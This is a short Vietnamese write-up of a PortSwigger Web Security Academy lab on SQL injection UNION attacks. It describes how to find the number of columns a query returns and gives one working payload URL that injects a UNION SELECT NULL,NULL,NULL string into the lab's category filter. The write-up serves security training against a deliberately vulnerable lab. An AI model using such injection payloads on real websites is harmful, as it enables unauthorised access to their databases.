# Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Lab URL:** [PortSwigger Lab](https://portswigger.net/web-security/union-attacks/lab-determine-number-of-columns)

## Mô tả

Bài lab yêu cầu ta xác định số cột trả về khi tiêm SQL để server trả về một hàng có giá trị null.

## Khai thác

Payload: `https://ac391ffa1e25ddc4c0e95d60001300d6.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--`

## Kết quả

![Solved SQLi union attack with null value](sqli-union-attack/solved-union-attack-null-value.jpg)
